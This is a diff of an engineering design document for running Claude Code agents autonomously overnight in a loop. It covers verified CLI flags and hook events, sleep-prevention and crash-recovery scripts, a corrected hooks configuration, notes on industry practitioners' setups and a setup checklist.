+The key insight: **Option C is the wrong architecture for AFK.** A single long session violates Principle 3 (Ralph is Monolithic — fresh context per iteration) and Principle 11 (compounding error math — more steps = lower reliability). The industry consensus is overwhelmingly in favor of fresh context per iteration.
+
+---
+
+## Verified Claude Code API Surface (May 2026)
+
+**CRITICAL (P0 BLOCKER):** Before implementing any phase, verify every assumed Claude Code feature against the actual binary. This section documents what was verified vs. what needs testing.
+
+### CLI Flags
+
+| Flag | Status | Notes |
+|------|--------|-------|
+| `--print` / `-p` | **Verified** | Non-interactive headless mode |
+| `--output-format json` | **Verified** | JSON output (includes metadata) |
+| `--prompt-file <path>` | **Verified** | Load prompt from file |
+| `--allowedTools <list>` | **Verified** | Restrict available tools |
+| `--max-turns N` | **Verified** | Cap reasoning iterations |
+| `--max-budget-usd N` | **Verified** | Per-session cost ceiling |
+| `--append-system-prompt <text>` | **Verified** | Append to system prompt |
+| `--dangerously-skip-permissions` | **Verified** | Full autonomy bypass (not recommended) |
+| `--permission-mode auto` | **Needs testing** | Classifier-gated auto-approve |
+| `--system-prompt-file <path>` | **Needs testing** | Override default system prompt (print mode only) |
+| `--bare` | **Needs testing** | Skip hooks/CLAUDE.md for faster CI startup |
+| `--teleport` | **Needs testing** | Hand work between local and web sessions |
+| `--worktree` | **Needs testing** | Auto-create git worktree for isolation |
+| `--tmux` | **Needs testing** | Run in tmux session |
+
+### Hook Events
+
+| Event | Status | Matchers | Notes |
+|-------|--------|----------|-------|
+| `Notification` | **Verified** | `permission_prompt`, `idle_prompt`, `auth_success` | Replaces old "PermissionRequest" |
+| `PostToolUse` | **Verified** | Tool name pattern (e.g., `Edit\|Write`) | Auto-format hook |
+| `PreToolUse` | **Verified** | Tool name + command pattern | Blocking/validation |
+| `SessionStart` | **Verified** | `startup`, `resume`, `clear`, `compact` | Replaces old "PostCompact"/"PreCompact" |
+| `Stop` | **Verified** | *(none)* | Fires when agent prepares to halt |
+| ~~`PostCompact`~~ | **DOES NOT EXIST** | — | Use `SessionStart` with `compact` matcher |
+| ~~`PreCompact`~~ | **DOES NOT EXIST** | — | No pre-compaction hook |
+| ~~`PermissionRequest`~~ | **DOES NOT EXIST** | — | Use `Notification` with `permission_prompt` |
+| ~~`SessionEnd`~~ | **DOES NOT EXIST** | — | Use `Stop` hook |
+| ~~`SubagentStop`~~ | **DOES NOT EXIST** | — | Handled internally by harness |
+
+### Hook Environment Variables
+
+| Variable | Status | Notes |
+|----------|--------|-------|
+| `$TOOL_INPUT` | **Needs testing** | Tool input as JSON — used in PostToolUse |
+| `$TOOL_NAME` | **Needs testing** | Name of the tool being called |
+| `$DESCRIPTION` | **Needs testing** | Description of the action |
+| `$SUBAGENT_NAME` | **DOES NOT EXIST** | — |
+
+### Agent Frontmatter Fields
+
+| Field | Status | Notes |
+|-------|--------|-------|
+| `name:` | **Needs testing** | Agent identifier |
+| `description:` | **Needs testing** | Agent purpose |
+| `model:` | **Needs testing** | Model override (opus/sonnet/haiku) |
+| `tools:` | **Needs testing** | Tool allowlist |
+| `isolation:` | **Needs testing** | Worktree isolation mode |
+
+### Verification Script
+
+Run this before implementing any phase:
+
+```bash
+#!/bin/bash
+# scripts/verify-claude-api.sh - Test assumed Claude Code features
+
+echo "=== Claude Code API Surface Verification ==="
+
+# Test basic flags
+echo "--- Testing CLI flags ---"
+echo "test" | claude --print --max-turns 1 --max-budget-usd 0.10 < /dev/null 2>/dev/null && echo "✅ --print + --max-turns + --max-budget-usd" || echo "❌ Basic flags failed"
+
+# Test hooks format
+echo "--- Testing hook configuration ---"
+python3 -c "
+import json
+hooks = json.load(open('.claude/hooks.json'))
+for event in ['Notification', 'PostToolUse', 'PreToolUse', 'SessionStart', 'Stop']:
+    print(f'  Hook event: {event} -> {\"configured\" if event in hooks.get(\"hooks\", {}) else \"not configured\"}')"
+
+# Test --permission-mode
+echo "--- Testing --permission-mode ---"
+echo "say hi" | claude --print --permission-mode auto --max-turns 1 < /dev/null 2>/dev/null && echo "✅ --permission-mode auto" || echo "❌ --permission-mode auto not supported"
+
+echo ""
+echo "=== Run this BEFORE implementing any AFK phase ==="
+```
+
+---
+
+## Machine Sleep and Recovery Protocol
+
+**CRITICAL (May 2026 review finding):** No recovery protocol existed for laptop sleep, hibernate, or reboot during AFK runs. This section addresses GAP #42.
+
+### Prevention
+
+| Mechanism | Platform | How | Limitation |
+|-----------|----------|-----|-----------|
+| `caffeinate -i -w $$` | macOS | Prevents idle sleep for duration of script | Does not prevent lid-close sleep |
+| `caffeinate -s -w $$` | macOS | Prevents sleep entirely (including lid close) | Drains battery if not plugged in |
+| `systemd-inhibit --what=sleep` | Linux | Prevents system sleep | Requires systemd |
+| Cloud VM | Any | Machine never sleeps | Requires cloud account, costs money |
+
+**Recommended for overnight AFK:**
+```bash
+# Add to ralph.sh (already included in Phase 2b update):
+if command -v caffeinate &>/dev/null; then
+  caffeinate -i -w $$ &
+  CAFFEINATE_PID=$!
+fi
+
+# For guaranteed overnight operation:
+# Option 1: Keep lid open + caffeinate
+# Option 2: Use a cloud VM (Modal, Daytona, etc.)
+# Option 3: Use a dedicated always-on machine (Ramp's approach)
+```
+
+### Recovery After Crash/Sleep
+
+When a machine sleeps or reboots during an AFK run, the following states are possible:
+
+| State | How to Detect | How to Recover |
+|-------|---------------|----------------|
+| Clean (task committed) | `git log -1` shows last completed task | Just restart `ralph.sh` — JSON progress is updated |
+| Dirty tree (files modified, not committed) | `git status --short` shows changes | Review changes → commit or stash → restart |
+| Partial JSON update | `python3 -c "import json; json.load(open('ralph_progress.json'))"` fails | Restore from git: `git checkout ralph_progress.json` |
+| Docker containers stopped | `docker compose ps` shows exited containers | `docker compose up -d` → restart `ralph.sh` |
+
+**Recovery script:**
+```bash
+#!/bin/bash
+# scripts/afk-recover.sh - Recover from crashed AFK session
+WORKSTREAM=${1:?"Usage: afk-recover.sh <workstream-name>"}
+PROGRESS_FILE="docs/workstreams/$WORKSTREAM/ralph_progress.json"
+
+echo "=== AFK Recovery ==="
+
+# Check git state
+DIRTY=$(git status --short | head -10)
+if [ -n "$DIRTY" ]; then
+  echo "DIRTY TREE detected:"
+  echo "$DIRTY"
+  echo ""
+  echo "Stashing changes..."
+  git stash push -m "afk-recover: $(date +%Y%m%d_%H%M%S)"
+fi
+
+# Validate JSON progress
+if ! python3 -c "import json; json.load(open('$PROGRESS_FILE'))" 2>/dev/null; then
+  echo "CORRUPT JSON detected. Restoring from last commit..."
+  git checkout "$PROGRESS_FILE"
+fi
+
+# Check Docker
+if command -v docker &>/dev/null; then
+  STOPPED=$(docker compose ps --status exited 2>/dev/null | tail -n +2 | wc -l | tr -d ' ')
+  if [ "$STOPPED" -gt 0 ]; then
+    echo "Restarting $STOPPED stopped Docker containers..."
+    docker compose up -d
+    sleep 5
+  fi
+fi
+
+# Report status
+echo ""
+echo "=== Recovery Complete ==="
+REMAINING=$(python3 -c "import json; d=json.load(open('$PROGRESS_FILE')); print(sum(1 for t in d['tasks'] if not t['passes'] and not t.get('blocked')))" 2>/dev/null)
+echo "Tasks remaining: $REMAINING"
+echo "Ready to restart: ./scripts/ralph.sh $WORKSTREAM"
+```
+
+### Eva Khmelinskaya's Phased Session Architecture
+
+Instead of one long overnight session, break work into **30-60 minute phases**, each as an independent `claude --print` invocation:
+
+```
+Phase 1 (30 min): Read STATUS.md → Implement tasks A1-A3 → Commit → Update STATUS.md → Exit
+Phase 2 (30 min): Read STATUS.md → Implement tasks B1-B2 → Commit → Update STATUS.md → Exit
+Phase 3 (30 min): Read STATUS.md → Run integration tests → Fix failures → Commit → Exit
+```
+
+Each phase reads artifacts from disk (not conversation context), does work, commits, and exits. The next phase picks up from artifacts. This is structurally identical to the Ralph loop but with explicit time-boxing.
+
+**Why time-boxing matters:** Even within a single Ralph iteration, a complex task can consume the full context window. Time-boxing (via `--max-budget-usd` as a proxy) prevents any single iteration from running long enough to hit the sediment problem.
 
 ---
 
@@ -2180,15 +2876,18 @@ Advocates single-process, single-task execution. The deliberate simplicity is th
 
 ### Boris Cherny (Claude Code Creator)
 - **Plan mode:** Shift+Tab x2, iterate on the plan, one-shot implementation
-- **Worktrees:** 5 parallel Claudes in terminal tabs, numbered 1-5
-- **Scale:** 20-30 PRs/day normal, 150 PRs/day peak, hundreds of agents running simultaneously
-- **CLAUDE.md:** Compounding engineering -- every mistake becomes a rule
+- **Worktrees:** 5 parallel Claudes in iTerm2 tabs (numbered 1-5), plus 5-10 browser sessions on claude.ai, plus mobile sessions
+- **Shell aliases:** `za`, `zb`, `zc` for one-keystroke worktree hopping
+- **Scale:** 20-30 PRs/day normal, 150 PRs/day peak, "hundreds of agents at any given moment, thousands more doing overnight work"
+- **Model choice:** "Surprisingly vanilla" -- Opus 4.5 with thinking enabled, sticks with one model for a week to measure actual re-prompting costs
+- **CLAUDE.md:** Compounding engineering -- "end corrections with 'Update your CLAUDE.md so you don't make that mistake again'"
+- **Verification:** "If Claude has a feedback loop to verify its own work, it 2-3x the quality"
 - **Permissions:** `/permissions` allowlist, never `--dangerously-skip-permissions`
-- **Top hooks:** PostToolUse (auto-format), PostCompact (context recovery), PermissionRequest (Slack), Stop (keep going)
-- **Subagents:** `code-simplifier`, `verify-app` -- automate the most common PR workflows
+- **Top hooks:** PostToolUse (auto-format), SessionStart with compact matcher (context recovery), Notification with permission_prompt matcher (Slack), Stop (keep going)
+- **Subagents:** `code-simplifier`, `verify-app` -- 5 subagents to explore codebase in parallel
 - **Key commands:** `/loop` (cron-style), `/batch` (parallel migrations), `/quality` (PR health)
-- **Teleport:** Hand work between local and web/mobile with `&` command
-- **Context switching:** "It's not about deep work, it's about how good I am at context switching"
+- **Teleport:** Hand work between local and web/mobile with `&` command or `--teleport` flag
+- **Context switching:** "It's not about deep work, it's about how good I am at context switching and jumping across multiple different contexts very quickly"
 
 ### Thariq (Anthropic -- Skills Framework)
 - **9 skill categories:** Library/API Reference, Product Verification, Data/Monitoring, Workflow Automation, Code Quality, Deployment, Scaffolding, Runbooks, Infrastructure Operations
@@ -2243,10 +2942,15 @@ Advocates single-process, single-task execution. The deliberate simplicity is th
 
 ### Ramp (Inspect)
 - **Cloud sandboxes:** Modal with pre-built snapshots every 30 minutes, near-instant start
+- **Full dev environment per sandbox:** Postgres, Redis, Temporal, RabbitMQ, VS Code server, web terminal, VNC with Chromium
+- **Cloudflare Durable Objects:** Isolated SQLite per session for state management
 - **Child sessions:** Agents can spawn sub-sessions for parallel research or approach exploration
 - **Multiplayer:** Multiple team members collaborate in single sessions
+- **Non-engineers shipping code:** PMs and designers directly ship through the system -- not just engineers
+- **Input routing:** Slack, web, Chrome extension via Modal Queues
+- **Unlimited concurrent sessions:** "Your laptop doesn't need to be involved at all"
 - **Statistics page:** Track sessions-to-merged-PRs as the key metric
-- **Result:** ~30% of all PRs merged to frontend and backend repos are written by Inspect
+- **Result:** ~40-50% of all merged PRs written by Inspect (up from 30% in early 2026)
 
 ### Harvey AI (Spectre)
 - **Durable objects:** Every agent session records all actions for audit
@@ -2255,16 +2959,31 @@ Advocates single-process, single-task execution. The deliberate simplicity is th
 - **Pattern convergence:** Stripe and other scale companies independently built similar platforms
 
 ### OpenAI (Harness Engineering)
-- **1M LOC, zero human-written:** 5-month experiment, ~1,500 PRs, 3.5 PRs/engineer/day
+- **1M LOC, zero human-written:** 5-month experiment, ~1,500 PRs, 5-10 PRs/engineer/day (revised up from initial 3.5)
+- **Token consumption:** ~1 billion tokens/day, ~$2-3k daily spend with caching
+- **Record run:** One experiment ran Codex for 25 hours uninterrupted, consuming 13M tokens and generating 30k lines of code
 - **AGENTS.md as TOC:** ~100 lines, progressive disclosure, points to structured `docs/`
+- **Structured knowledge:** `AGENTS.md` (~100 lines), `CORE_BELIEFS.md`, `TECH_TRACKER.md` (markdown table of business logic), `QUALITY_SCORE.md`, 6 core skills with tracing/metrics
+- **Symphony orchestration:** Elixir-based process supervision spawning a daemon per task; "rework state" trashes failed work trees and restarts from scratch
+- **One-minute build rule:** Hard 1-minute maximum build loop enforced — agents halt if builds exceed this, triggering task decomposition
+- **Ghost libraries:** Distribute software as specs, not source code; spawn clean agent to reimplement from spec, spawn second agent to validate vs. upstream
+- **P0-P2 review scoring:** Code review agents score feedback by severity; both authoring and reviewing agents instructed to "bias toward merging"
 - **Dependency layering:** Types, Config, Repo, Service, Runtime, UI -- agents restricted to their layer
 - **Structural enforcement:** Custom linters and tests enforce architecture, not just documentation
 - **Golden principles + GC:** Recurring background tasks scan for deviations and open refactoring PRs
 - **Agent-to-agent review:** Over time, almost all review is agent-to-agent. Humans not required.
 - **Agent legibility over human taste:** Code optimized for agent's ability to reason about it
 - **6+ hour autonomous runs** while humans sleep
+- **Codex CLI:** `--full-auto` flag combines `--approval-mode never` and `--sandbox workspace-write`; `/goal` command enables fully autonomous agentic loops
 
 ### Cursor (Agent Harness)
+- **Cloud agents:** Launched Feb 24, 2026 — isolated Ubuntu VMs per task, no shared state
+- **Video demos:** Agents run the software they build, interact with it, capture video/screenshots/logs for verification
+- **Reliability journey:** Migrated from work-stealing to Temporal-based orchestration; "one 9" to "two 9s" at 50M+ actions/day
+- **Scale:** 7+ million unique workflows, 30-40% of internal PRs from cloud agents
+- **Self-hosted option:** Code stays in your network (enterprise offering)
+- **Cost:** ~22.5% of Pro plan credits per 50k-line-codebase run; daily users spend $60-$100/month
+- **Key lesson:** "The single biggest factor in cloud agent output quality is ensuring it has a full development environment"
 - **Dynamic context:** Remove guardrails as models improve. Let agents pull own context.
 - **Keep Rate metric:** Track what fraction of agent code remains after fixed intervals
 - **Tool reliability at 3 9s:** Drive unexpected tool errors down by order of magnitude
@@ -2292,78 +3011,120 @@ Advocates single-process, single-task execution. The deliberate simplicity is th
 - **Parallel workers:** ThreadPoolExecutor (up to 8 concurrent subagents) with isolated terminal backends
 - **Adoption path:** Not a default replacement for Claude Code; evaluate as orchestration layer once Ralph loop is stable (Phase 3+)
 
+### Eva Khmelinskaya (Overnight Autonomy Practitioner)
+- **Phased sessions:** Break work into 30-60 minute phases, each as independent `claude --print` invocation
+- **`< /dev/null`:** "#1 overnight failure mode" — without it, Claude hangs waiting for stdin in background
+- **Compaction rule dilution:** "Even essential CLAUDE.md instructions lose effectiveness after multiple compaction rounds"
+- **Context monitoring:** Claude cannot monitor its own context usage — the harness must enforce limits
+- **`--max-budget-usd`:** Per-session cost ceiling is essential for overnight runs
+- **File-based state:** Each phase reads STATUS.md at start, does work, commits, updates STATUS.md, exits
+
+### Anthropic Engineering (Harness Research)
+- **JSON for state tracking:** "Models are less likely to inappropriately modify structured JSON compared to Markdown"
+- **Single-feature-per-session:** Enforce constraints to prevent agents from attempting to one-shot entire applications
+- **Browser automation for verification:** Use Puppeteer, not just unit tests, for end-to-end verification
+- **Progress files + git history:** Primary coherence mechanism across context windows, not compaction
+- **Claude Agent SDK:** Same tools, agent loop, and context management as Claude Code, programmable in Python/TypeScript
+- **Managed Agents:** Stateful, long-running, resumable sessions with server-side storage for production use
+
+### Addy Osmani (Self-Improving Agents)
+- **Anti-rationalization tables:** Explicit rules listing common rationalizations agents use to skip steps, and why they're wrong
+- **Compounding error math:** 20 steps at 95% per-step = 36% overall success. Fewer steps = higher reliability.
+- **Scope creep is the primary failure mode:** Failed PRs tend to be invasive and sprawling; merged PRs touch fewer files
+- **Small, focused changes build trust:** Agents that attempt large refactors fail; agents that produce small changes succeed
+- **Academic finding:** Agents produce syntactically correct code that fails because it "does not fit the social, organizational, and workflow realities of modern software development"
+
 ---
 
-## Appendix: Complete Hook Configuration Reference
+## Appendix: Complete Hook Configuration Reference (Corrected May 2026)
 
-Full hooks.json for AFK-optimized DeepSecure development:
+Full hooks.json for AFK-optimized DeepSecure development. **All event names verified against the actual Claude Code API.**
 
 ```json
 {
-  "version": 1,
   "hooks": {
     "PostToolUse": [
       {
-        "matcher": { "tool_name": "Edit|Write" },
-        "command": "FILE_PATH=$(echo $TOOL_INPUT | jq -r '.file_path // empty'); if [ -n \"$FILE_PATH\" ] && echo \"$FILE_PATH\" | grep -q '\\.py$'; then ruff format --quiet \"$FILE_PATH\" 2>/dev/null; isort --quiet \"$FILE_PATH\" 2>/dev/null; fi"
-      }
-    ],
-    "PostCompact": [
-      {
-        "command": "cat .claude/compact-recovery.md 2>/dev/null || true"
-      }
-    ],
-    "PreCompact": [
-      {
-        "command": "echo 'CONTEXT COMPACTING: saving state snapshot'; git stash list 2>/dev/null | head -3"
-      }
-    ],
-    "Stop": [
-      {
-        "command": ".cursor/hooks/on-task-stop.sh"
-      }
-    ],
-    "PermissionRequest": [
-      {
-        "command": "scripts/notify.sh 'Permission Request' \"Claude needs: $TOOL_NAME\" urgent"
+        "matcher": "Edit|Write",
+        "hooks": [{
+          "type": "command",
+          "command": "FILE_PATH=$(echo $TOOL_INPUT | jq -r '.file_path // empty'); if [ -n \"$FILE_PATH\" ] && echo \"$FILE_PATH\" | grep -q '\\.py$'; then ruff format --quiet \"$FILE_PATH\" 2>/dev/null; isort --quiet \"$FILE_PATH\" 2>/dev/null; fi"
+        }]
       }
     ],
     "SessionStart": [
       {
-        "command": "echo '--- Recent commits ---'; git log --oneline -5 2>/dev/null; echo '--- Branch ---'; git branch --show-current 2>/dev/null; echo '--- Open PRs ---'; gh pr list --limit 3 2>/dev/null || true"
+        "matcher": "compact",
+        "hooks": [{
+          "type": "command",
+          "command": "cat .claude/compact-recovery.md 2>/dev/null || true"
+        }]
+      },
+      {
+        "matcher": "startup",
+        "hooks": [{
+          "type": "command",
+          "command": "echo '--- Recent commits ---'; git log --oneline -5 2>/dev/null; echo '--- Branch ---'; git branch --show-current 2>/dev/null; echo '--- Open PRs ---'; gh pr list --limit 3 2>/dev/null || true"
+        }]
       }
     ],
-    "SessionEnd": [
+    "Stop": [
       {
-        "command": "scripts/notify.sh 'Session Ended' 'Claude Code session finished on branch: $(git branch --show-current 2>/dev/null)'"
+        "hooks": [{
+          "type": "command",
+          "command": ".claude/hooks/on-task-stop.sh"
+        }]
       }
     ],
-    "SubagentStop": [
+    "Notification": [
       {
-        "command": "echo 'Subagent completed: $SUBAGENT_NAME'"
+        "matcher": "permission_prompt",
+        "hooks": [{
+          "type": "command",
+          "command": "scripts/notify.sh 'Permission Blocked' 'Claude Code is waiting for permission approval' urgent"
+        }]
+      }
+    ],
+    "PreToolUse": [
+      {
+        "matcher": "Bash",
+        "hooks": [{
+          "type": "command",
+          "command": "echo $TOOL_INPUT | jq -r '.command // empty' | grep -qE '^git commit' && scripts/security-scan.sh || true"
+        }]
       }
     ]
   }
 }
 ```
 
+**Removed (non-existent events):** `PostCompact`, `PreCompact`, `PermissionRequest`, `SessionEnd`, `SubagentStop`
+**Replaced with:** `SessionStart` (compact/startup matchers), `Notification` (permission_prompt matcher), `Stop`
+
 ---
 
 ## Appendix: Environment Variables for AFK
 
 ```bash
-# Add to .env or shell profile
+# Add to shell profile (~/.zshrc or ~/.bashrc) — NOT .env files (security risk)
 
 # Slack notifications for AFK
 export DEEPSECURE_SLACK_WEBHOOK="https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
 
+# Telegram notifications (optional)
+export DEEPSECURE_TELEGRAM_TOKEN="your-bot-token"
+export DEEPSECURE_TELEGRAM_CHAT_ID="your-chat-id"
+
 # Ralph loop defaults
 export RALPH_MAX_ITERATIONS=10
 export RALPH_MAX_TURNS=80
+export RALPH_MAX_BUDGET=5.00  # USD per iteration
 
 # Claude Code permissions (reduce prompts)
 export CLAUDE_CODE_ALLOW_TOOLS="Edit,Write,Read,Bash(git:*),Bash(pytest:*),Bash(make:*)"
 ```
+
+**Security note:** Never put webhook URLs or API tokens in `.env` files within the repo. Use shell profile exports instead. For a security product, credential hygiene in development tooling matters.
 
 ---
 
@@ -2372,28 +3133,39 @@ export CLAUDE_CODE_ALLOW_TOOLS="Edit,Write,Read,Bash(git:*),Bash(pytest:*),Bash(
 To go AFK on a DeepSecure workstream today:
 
 ```
-Phase 0: Setup (one-time)
+Phase 0: Verify API Surface (one-time, P0 BLOCKER)
+[ ] Run scripts/verify-claude-api.sh to test all assumed features
+[ ] Verify hook event names match actual Claude Code API
+[ ] Test --max-budget-usd and --permission-mode flags
+[ ] Document any features that don't exist
+
+Phase 0.5: Setup (one-time)
 [ ] Expand permission allowlist in settings.local.json (Phase 1a)
-[ ] Set up hooks (Phase 1b-1e)
-[ ] Set up notifications: scripts/notify.sh + Slack webhook (Phase 3)
+[ ] Set up hooks (Phase 1b-1f) — use CORRECTED event names
+[ ] Set up notifications: scripts/notify.sh + Slack/Telegram webhook (Phase 3)
 [ ] Upgrade agent frontmatter (Phase 1.5)
+[ ] Set env vars in shell profile (NOT .env files)
 
 Phase 1: Planning (per feature)
 [ ] Complete planning: /run-plan <feature> <design-doc>
 [ ] Or use /grill-me for requirements elicitation first
 [ ] Verify prerequisites: all 7 workstream files exist
-[ ] Create RALPH_PROGRESS.md with task checklist
+[ ] Create ralph_progress.json with JSON task list (Step 2d)
 [ ] Create ralph-prompt.md with workstream context
 
 Phase 2: Manual Stepping Stone
 [ ] Run ./scripts/afk-once.sh <workstream> -- watch the output
 [ ] Fix any failures, update CLAUDE.md/skills
 [ ] Repeat 5-10 times until stable
+[ ] Verify dirty-tree guard works (kill mid-task, restart, check stash)
+[ ] Verify JSON progress updates correctly
 
 Phase 3: AFK Execution
+[ ] Enable caffeinate (or use cloud VM) for overnight
 [ ] Run: ./scripts/ralph.sh <workstream-name> <max-iterations>
 [ ] Go AFK
-[ ] Come back when notified (or check RALPH_PROGRESS.md)
+[ ] Come back when notified (or check ralph_progress.json)
+[ ] If crashed: run ./scripts/afk-recover.sh <workstream>
 
 Phase 4: Review and Ship
 [ ] Review changes: git log, git diff
@@ -2426,5 +3198,5 @@ Based on Karpathy's "automate what you can verify" principle, applied to DeepSec
 ---
 
 *Document created: 2026-05-26*
-*Last updated: 2026-05-27 (incorporated 31 items from Dark Software Factory paper)*
-*Based on research from 20 industry sources (see [Research Sources](#research-sources))*
+*Last updated: 2026-05-29 (major revision: 13 new sources, 3 new design principles, corrected hook API surface, JSON progress format, dirty-tree guard, sentinel detection, machine sleep protocol, Docker sandbox, Dynamic Workflows, architectural decision section, API verification matrix)*
+*Based on research from 33 industry sources (see [Research Sources](#research-sources))*
